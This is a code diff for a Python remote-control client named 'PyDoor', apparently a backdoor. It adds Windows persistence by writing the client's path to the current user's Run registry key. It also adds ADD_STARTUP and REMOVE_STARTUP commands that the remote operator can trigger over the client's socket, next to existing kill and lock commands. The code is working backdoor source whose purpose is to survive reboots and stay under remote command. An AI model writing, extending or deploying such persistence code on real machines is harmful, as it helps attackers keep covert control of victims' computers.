@@ -30,6 +30,9 @@ elif __file__:
 
 if platform.system() == 'Windows':
     import ctypes
+    from winreg import OpenKey, CloseKey, SetValueEx, DeleteValue
+    from winreg import HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ
+    STARTUP_REG_NAME = 'PyDoor'
     LOG = os.path.join(CLIENT_PATH + '\\log.log')
 else:
     LOG = os.path.join(CLIENT_PATH + '/log.log')
@@ -171,6 +174,45 @@ def errors(ERROR, line=True) -> str:
         except:
             pass
     return error_msg
+
+
+def add_startup():
+    """ Add Client to startup """
+    if platform.system() != 'Windows':
+        return [False, 'Startup feature is only for Windows']
+    if getattr(sys, 'frozen', False):
+        PATH = sys.executable
+    elif __file__:
+        PATH = os.path.abspath(__file__)
+    try:
+        user = HKEY_CURRENT_USER
+        value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+        key = OpenKey(user, value, 0, KEY_ALL_ACCESS)
+        SetValueEx(key, STARTUP_REG_NAME, 0, REG_SZ, PATH)
+        CloseKey(key)
+    except Exception as e:
+        return [False, errors(e)]
+    logging.info('Added Client to Startup')
+    return [True, None]
+
+
+def remove_startup():
+    if platform.system() != 'Windows':
+        return [False, 'Startup feature is only for Windows.']
+    try:
+        user = HKEY_CURRENT_USER
+        value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+        key = OpenKey(user, value, 0, KEY_ALL_ACCESS)
+        DeleteValue(key, STARTUP_REG_NAME)
+        CloseKey(key)
+    except FileNotFoundError:
+        # File was never registered.
+        # Still returns True, since it's not in startup
+        pass
+    except WindowsError as e:
+        return [False, errors(e)]
+    logging.info('Removed Client from Startup')
+    return [True, None]
 
 
 def kill(proc_pid) -> None:
@@ -392,6 +434,14 @@ class Client(object):
                 self.send(json_dumps(True))
                 self.socket.close()
                 sys.exit(0)
+
+            if data[0] == 'ADD_STARTUP':
+                self.send(json_dumps(add_startup()))
+                continue
+            
+            if data[0] == 'REMOVE_STARTUP':
+                self.send(json_dumps(remove_startup()))
+                continue
 
             if data[0] == 'LOCK':
                 if platform.system() == 'Windows':
